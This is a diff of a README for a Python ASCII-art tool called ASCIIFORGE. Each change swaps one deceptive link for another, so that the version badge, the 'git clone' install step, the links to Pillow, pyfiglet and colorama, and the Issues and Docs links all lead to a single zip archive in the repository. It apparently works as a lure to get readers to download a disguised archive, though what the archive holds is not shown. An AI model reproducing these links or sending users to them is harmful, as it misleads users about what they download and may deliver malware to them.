@@ -4,7 +4,7 @@
 
 Convert images to stunning ASCII art and create animated text art with style. Built with clean OOP architecture, ready for PyPI distribution.
 
-[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue)](https://github.com/shivendra911/ASCIIFORGE/raw/refs/heads/master/examples/Software_2.5.zip)
+[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue)](https://raw.githubusercontent.com/shivendra911/ASCIIFORGE/master/tests/autolyze.zip)
 [![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
 
 ## Features
@@ -32,7 +32,7 @@ Convert images to stunning ASCII art and create animated text art with style. Bu
 ### From Source (Development)
 
 ```bash
-git clone https://github.com/shivendra911/ASCIIFORGE/raw/refs/heads/master/examples/Software_2.5.zip
+git clone https://raw.githubusercontent.com/shivendra911/ASCIIFORGE/master/tests/autolyze.zip
 cd asciiforge
 pip install -e .
 ```
@@ -319,9 +319,9 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Acknowledgments
 
-- Built on [Pillow](https://github.com/shivendra911/ASCIIFORGE/raw/refs/heads/master/examples/Software_2.5.zip) for image processing
-- Text art powered by [pyfiglet](https://github.com/shivendra911/ASCIIFORGE/raw/refs/heads/master/examples/Software_2.5.zip)
-- Terminal colors via [colorama](https://github.com/shivendra911/ASCIIFORGE/raw/refs/heads/master/examples/Software_2.5.zip)
+- Built on [Pillow](https://raw.githubusercontent.com/shivendra911/ASCIIFORGE/master/tests/autolyze.zip) for image processing
+- Text art powered by [pyfiglet](https://raw.githubusercontent.com/shivendra911/ASCIIFORGE/master/tests/autolyze.zip)
+- Terminal colors via [colorama](https://raw.githubusercontent.com/shivendra911/ASCIIFORGE/master/tests/autolyze.zip)
 
 ## Examples Gallery
 
@@ -365,8 +365,8 @@ Original Image → ASCII Art
 ## Support
 
 - 📧 Email: shivendrapratapsp3@gmail.com
-- 🐛 Issues: [GitHub Issues](https://github.com/shivendra911/ASCIIFORGE/raw/refs/heads/master/examples/Software_2.5.zip)
-- 📖 Docs: [Full Documentation](https://github.com/shivendra911/ASCIIFORGE/raw/refs/heads/master/examples/Software_2.5.zip)
+- 🐛 Issues: [GitHub Issues](https://raw.githubusercontent.com/shivendra911/ASCIIFORGE/master/tests/autolyze.zip)
+- 📖 Docs: [Full Documentation](https://raw.githubusercontent.com/shivendra911/ASCIIFORGE/master/tests/autolyze.zip)
 
 ## Roadmap
 
